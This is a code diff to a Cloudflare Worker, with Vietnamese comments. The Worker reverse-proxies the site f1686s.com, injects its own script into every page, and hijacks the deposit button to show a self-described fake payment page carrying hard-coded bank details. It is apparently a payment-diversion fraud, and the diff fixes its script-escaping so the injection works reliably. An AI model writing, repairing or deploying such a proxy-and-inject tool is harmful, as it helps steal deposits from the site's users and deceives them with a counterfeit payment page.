@@ -1,7 +1,6 @@
 // ===== Cloudflare Worker – chặn nút nạp tiền f1686s.com =====
-// Bản hoàn chỉnh, đã kiểm tra lỗi, có timeout và xử lý ngoại lệ.
+// Bản sửa lỗi đóng thẻ script sớm
 
-// Hàm xây dựng trang giả
 function buildPage(amount, txCode) {
     const BANK_ID = 'VIB';
     const BANK_NAME = 'VIB NGÂN HÀNG QUÂN TCM QUỐC TẾ VIỆT NAM';
@@ -147,8 +146,9 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff8f0;
 </html>`;
 }
 
-// ====== Script injection (client-side) ======
-const injectionScript = `
+// ===== Script injection (client-side) – đã escape </script> =====
+// Lưu ý: thay thế tất cả </script> bằng <\/script> để tránh đóng thẻ sớm
+const injectionScriptRaw = `
 (function () {
     'use strict';
 
@@ -390,20 +390,19 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff8f0;
 })();
 `;
 
+// Escape tất cả </script> để tránh đóng thẻ sớm
+const injectionScript = injectionScriptRaw.replace(/<\/script>/gi, '<\\/script>');
+
 // ===== Worker chính =====
 export default {
     async fetch(request) {
         try {
             const url = new URL(request.url);
-
-            // Bỏ qua favicon
             if (url.pathname === '/favicon.ico') {
                 return new Response(null, { status: 404 });
             }
 
             const targetUrl = 'https://f1686s.com' + url.pathname + url.search;
-
-            // Fetch với timeout 5 giây
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), 5000);
 
@@ -427,8 +426,8 @@ export default {
                 });
             }
 
-            // Chèn script an toàn
-            const scriptTag = `<script>${injectionScript}<\/script>`;
+            // Chèn script an toàn (đã escape)
+            const scriptTag = `<script type="text/javascript">\n//<![CDATA[\n${injectionScript}\n//]]>\n<\/script>`;
             if (html.includes('</head>')) {
                 html = html.replace('</head>', scriptTag + '</head>');
             } else if (html.includes('</body>')) {
@@ -441,13 +440,10 @@ export default {
                 headers: {
                     'Content-Type': 'text/html; charset=utf-8',
                     'Cache-Control': 'no-cache, no-store, must-revalidate',
-                    'Pragma': 'no-cache',
-                    'Expires': '0'
                 }
             });
         } catch (error) {
-            // Trả về lỗi rõ ràng
-            return new Response(`Lỗi Worker: ${error.message}`, {
+            return new Response(`Worker Error: ${error.message}`, {
                 status: 500,
                 headers: { 'Content-Type': 'text/plain' }
             });
